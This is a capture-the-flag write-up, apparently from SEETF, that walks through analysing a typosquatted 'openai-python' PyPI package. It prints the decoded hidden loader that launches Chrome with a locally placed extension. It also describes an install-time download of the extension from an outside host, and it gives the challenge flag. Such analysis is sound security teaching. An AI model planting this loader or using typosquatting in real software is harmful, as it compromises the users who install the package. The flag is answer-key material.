# my-first-python-project

**Author**: YongJunLim

**Category**: Misc

Flag: `SEE{typ05qu4773d_p4ck4g3_n4m35_en4jal3z9mc0nh6nvbt548u0z47q9lso}`

## Description

I recently joined one of the SEE-IA's outreach programs, which offer a wide variety of enrichment activities for elementary, middle, and high school students. Their introductory program taught me about ChatGPT and how I could interface with it using the OpenAI Python library. I followed their tutorial exactly, yet it seems to make my computer a lot slower than I expected.

## Difficulty

Beginner Friendly

## Solution

1. The `requirements.txt` file references a Python package named `openai-python`. This is different from the official Python package provided by [OpenAI](https://pypi.org/project/openai/).

2. By searching the typosquatted package on https://pypi.mirror.seetf.sg/packages/simple/openapi-python, one is able to download and view the source distribution files `openai-python-0.26.5.tar.gz`.

3. Inside the source distribution files, `openai/__init__.py` contains a Base64 string which will be decoded and executed when the module `openai` is imported. The Base64 string is decoded to:
```python
extension_path = os.path.join(os.path.expanduser("~"), "Downloads", "Extension")
from platform import system
from subprocess import run
if os.path.exists(extension_path):
    name = system()
    if name == "Windows":
        run(["C:\Program Files (x86)\Google\Chrome\Application\chrome.exe", f"--load-extension={extension_path}"])
    elif name == "Darwin":
        run(["/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", f"--load-extension={extension_path}"])
    elif name == "Linux":
        run(["/usr/bin/google-chrome", f"--load-extension={extension_path}"])
```

4. `extension_path` is also referenced in `setup.py`, which downloads the Chrome extension's files from http://pypi.seeia.seetf.sg during initial installation.

5. By performing a DNS lookup (`dig pypi.seeia.seetf.sg`), the domain is shown to be associated with the IP address `185.244.226.4`. A reverse DNS lookup shows that the IP address is associated with the domain [link.storjshare.io.](https://link.storjshare.io) as well.

6. Based on [Storj's documentation](https://docs.storj.io/dcs/how-tos/host-a-static-website/host-a-static-website-with-the-cli-and-linksharing-service), static websites can be hosted on Storj DCS (Decentralized Cloud Storage). In addition, the documentation states 2 TXT records are required in the following format:
```
txt-<hostname> 	IN	TXT  	storj-root:<bucket>/<prefix>
txt-<hostname> 	IN	TXT  	storj-access:<access key>
```

7. Using the dig command `dig txt-pypi.seeia.seetf.sg TXT` would show the 2 TXT records:
```
txt-pypi.seeia.seetf.sg. 3600    IN      TXT     "storj-access:jx4dw26pwrjp5rb6l2jn4a3nfy7a"
txt-pypi.seeia.seetf.sg. 3600    IN      TXT     "storj-root:site/src"
```

8. By searching for the format of shared bucket URLs from the documentation, one will find the [public bucket](https://link.storjshare.io/s/jx4dw26pwrjp5rb6l2jn4a3nfy7a/site) to contain `flag.txt` in the root directory.
